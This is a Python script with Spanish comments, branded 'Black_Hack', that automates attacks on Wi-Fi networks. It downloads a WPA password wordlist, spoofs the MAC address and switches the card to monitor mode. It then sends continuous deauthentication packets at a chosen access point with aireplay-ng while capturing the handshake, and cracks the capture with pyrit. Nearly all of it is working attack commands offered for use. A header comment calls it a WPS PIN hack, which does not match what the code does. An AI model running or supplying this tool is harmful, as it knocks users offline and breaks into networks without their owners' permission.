#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import os, time, threading
from io import open
## Crador Smp_A
# Fecha 25.7.2020
# Licencia Open soft GNU
# Nombre programa Rambo WiFi telefono
# Tipo Script shell
# Hack pin wps Wifi basado en craking rainbow
# lenguaje Python3 
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
print("\033[1;31;1m ")
os.system('figlet        Smp_A')
print("		 Black_Hack")                 	
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
listamenu=["Opciones:","1) Install diccionario" ,"2) Scaner red ", "3) Capture", "4) Crack", "5) Exit"]#Menu Princcipal
key=0
exit=False
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
	print(listamenu[4])
	print(listamenu[5])
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def config():
	global wlan
	while True:
		try:
			deci=input("Quiere instalar diccionario Pyrit? :")
			if(deci =='y'):
				os.system('wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt')
				os.system('pyrit benchmark')
				os.system('pyrit -i /root/Especial_termux_kali/probable-v2-wpa-top4800.txt import_passwords')
			print("Diccionario instalado")
			break
		except TypeError:
			print("Wlan no permitida")

def scan():
	global bssid
	global canal
	global diccionario
	global wlan
	time_scan=input("Seleccione tiempo de escaneo default 60 : ")
	if(time_scan==''):
		time_scan="60"
	os.system('nmcli -w '+time_scan+' device wifi list')
		
	bssid=input("seleccione BSSID : ")
	canal=input("seleccione CHANEL : ")
	dice=input("Quiere ingresar un nuevo diccionario? y o n: ")
	if(dice=='y'):
		diccionario=input("Introduzca ruta diccionario en .stl:")
		os.system('pyrit -i '+diccionario+' import_passwords')
	else:
		diccionario=1
		os.system("ifconfig")
		wlan=input("Introduzca Wlan: ")
		if(wlan=="wlan0mon" or wlan== "wlan1mon"):
			wlan=wlan
		else:
			print("Procesando")
			os.system('ifconfig '+wlan+' down')
			time.sleep(1)
			os.system('macchanger -A '+wlan)
			time.sleep(1)
			os.system('ifconfig '+wlan+' up') 
			time.sleep(1)
			os.system('airmon-ng check kill')
			time.sleep(1)
			os.system('airmon-ng start '+wlan)
			time.sleep(1)
			os.system('airmon-ng check '+wlan)
			time.sleep(1)
			wlan=(wlan+"mon")
	print(wlan)
	return bssid,canal,diccionario, wlan

def attack(wlan,bssid,canal):
	os.system('x-terminal-emulator -e airodump-ng -c '+canal+' -w file --bssid '+bssid+' '+wlan)
	os.system('x-terminal-emulator -e aireplay-ng -0 0 -a'+bssid+' '+wlan+' --ignore-negative-one')
	
def crack(bssid,diccionario):
		os.system('pyrit -r /root/Especial_termux_kali/file-01.cap analyze') 
		os.system('x-terminal-emulator -e pyrit -r /root/Especial_termux_kali/file-01.cap -o savedpass attack_batch') 
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
while exit==False:
	menu()
	key=(int(input()))
	if (key==1):
		config()
		print(wlan)
	elif (key==2):
		scan()
	elif (key==3):
		attack(wlan,bssid,canal)
	elif (key==4):
		crack(bssid,diccionario)
	elif (key==5):	
		os.system('airmon-ng stop wlan0mon')
		os.system('ifconfig wlan0 down')
		os.system('iwconfig wlan0 mode managed')
		os.system('ifconfig wlan0 up')
		os.system('service network-manager start')
		exit=True
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
